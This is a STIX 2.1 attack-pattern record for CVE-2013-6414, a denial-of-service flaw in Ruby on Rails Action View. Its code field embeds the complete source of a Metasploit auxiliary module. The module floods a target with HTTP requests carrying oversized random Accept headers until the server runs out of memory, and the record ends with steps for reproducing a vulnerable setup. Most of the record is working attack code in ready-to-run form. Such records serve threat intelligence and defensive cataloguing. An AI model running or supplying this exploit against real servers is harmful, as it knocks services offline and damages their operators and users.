{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d5335d86-fef6-4c9a-ae84-5d3ccd7a2795",
    "created": "2024-08-14T16:26:05.746629Z",
    "modified": "2024-08-14T16:26:05.746633Z",
    "name": "Ruby on Rails Action View MIME Memory Exhaustion",
    "description": " This module exploits a Denial of Service (DoS) condition in Action View that requires a controller action. By sending a specially crafted content-type header to a Rails application, it is possible for it to store the invalid MIME type, and may eventually consume all memory if enough invalid MIMEs are given.  Versions 3.0.0 and other later versions are affected, fixed in 4.0.2 and 3.2.16. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/rails_action_view.rb",
            "external_id": "rails_action_view.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-6414"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2013/q4/400"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rails/rails/commit/bee3b7f9371d1e2ddcfe6eaff5dcb26c0a248068"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Ruby on Rails Action View MIME Memory Exhaustion',\n      'Description'    => %q{\n        This module exploits a Denial of Service (DoS) condition in Action View that requires\n        a controller action. By sending a specially crafted content-type header to a Rails\n        application, it is possible for it to store the invalid MIME type, and may eventually\n        consume all memory if enough invalid MIMEs are given.\n\n        Versions 3.0.0 and other later versions are affected, fixed in 4.0.2 and 3.2.16.\n      },\n      'Author'         =>\n        [\n          'Toby Hsieh', # Reported the issue\n          'joev',       # Metasploit\n          'sinn3r'      # Metasploit\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2013-6414' ],\n          [ 'OSVDB', '100525' ],\n          [ 'BID', '64074' ],\n          [ 'URL', 'https://seclists.org/oss-sec/2013/q4/400' ],\n          [ 'URL', 'https://github.com/rails/rails/commit/bee3b7f9371d1e2ddcfe6eaff5dcb26c0a248068' ]\n        ],\n      'DisclosureDate' => '2013-12-04'))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('URIPATH',     [true, 'The URI that routes to a Rails controller action', '/']),\n        OptInt.new('MAXSTRINGSIZE',  [true, 'Max string size', 60000]),\n        OptInt.new('REQCOUNT',       [true, 'Number of HTTP requests to pipeline per connection', 1]),\n        OptInt.new('RLIMIT',         [true, 'Number of requests to send', 100000])\n      ],\n    self.class)\n  end\n\n  def host\n    host = datastore['RHOST']\n    host += \":\" + datastore['RPORT'].to_s if datastore['RPORT'] != 80\n    host\n  end\n\n  def long_string\n    Rex::Text.rand_text_alphanumeric(datastore['MAXSTRINGSIZE'])\n  end\n\n  #\n  # Returns a modified version of the URI that:\n  # 1. Always has a starting slash\n  # 2. Removes all the double slashes\n  #\n  def normalize_uri(*strs)\n    new_str = strs * \"/\"\n\n    new_str = new_str.gsub!(\"//\", \"/\") while new_str.index(\"//\")\n\n    # Makes sure there's a starting slash\n    unless new_str.start_with?(\"/\")\n      new_str = '/' + new_str\n    end\n\n    new_str\n  end\n\n  def http_request\n    uri = normalize_uri(datastore['URIPATH'])\n\n    http = ''\n    http << \"GET #{uri} HTTP/1.1\\r\\n\"\n    http << \"Host: #{host}\\r\\n\"\n    http << \"Accept: #{long_string}\\r\\n\"\n    http << \"\\r\\n\"\n\n    http\n  end\n\n  def run\n    begin\n      print_status(\"Stressing the target memory, this will take quite some time...\")\n      datastore['RLIMIT'].times { |i|\n        connect\n        datastore['REQCOUNT'].times { sock.put(http_request) }\n        disconnect\n      }\n\n      print_status(\"Attack finished. Either the server isn't vulnerable, or please dos harder.\")\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      print_status(\"Unable to connect to #{host}.\")\n    rescue ::Errno::ECONNRESET, ::Errno::EPIPE, ::Timeout::Error\n      print_good(\"DoS successful. #{host} not responding. Out Of Memory condition probably reached.\")\n    ensure\n      disconnect\n    end\n  end\nend\n\n=begin\n\nReproduce:\n\n1. Add a def index; end to ApplicationController\n2. Add an empty index.html.erb file to app/views/application/index.html.erb\n3. Uncomment the last line in routes.rb\n4. Hit /application\n\n=end\n",
    "x_mitre_disclosure_date": "2013-12-04"
}